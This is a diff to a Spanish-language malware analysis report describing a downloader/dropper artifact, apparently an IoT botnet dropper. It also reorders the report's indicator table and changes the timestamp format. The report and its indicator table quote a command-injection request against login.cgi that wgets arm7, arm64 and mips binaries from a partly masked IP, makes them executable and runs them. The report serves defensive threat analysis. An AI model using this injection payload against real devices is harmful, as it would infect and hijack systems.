@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with very long lines (306), with CRLF line terminators de 368 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `arm7` en `hxxp://85.11.167.XXX/arm7`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:40:04+00:00`
+- **Registrado:** `2026-08-09T19:40:04.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,10 +52,10 @@ GET /login.cgi?cli=aa%20aa%27;wget%20http://85.11.167.XXX/arm7%20-O%20/tmp/arm7;
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 85.11.167.XXX | static_analysis |
 | url | hxxp://85.11.167.XXX/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%20http://85.11.167.XXX/arm64%20-O%20/tmp/arm64;chmod%20777%20/tmp/arm64;/tmp/arm64;wget%20http://85.11.167.XXX/mips%20-O%20/tmp/mips;chmod%20777%20/tmp/mips;/tmp/mips%20dlink%27$ | strings |
-| hash | 5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2 | static_analysis |
+| ip | 85.11.167.XXX | static_analysis |
 | command | GET /login.cgi?cli=aa%20aa%27;wget%20http://85.11.167.XXX/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%2 | strings |
+| hash | 5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2 | static_analysis |
 | ip | 45.41.105.XXX | artifact_source |
 
 ## 🛡️ Nota de publicación
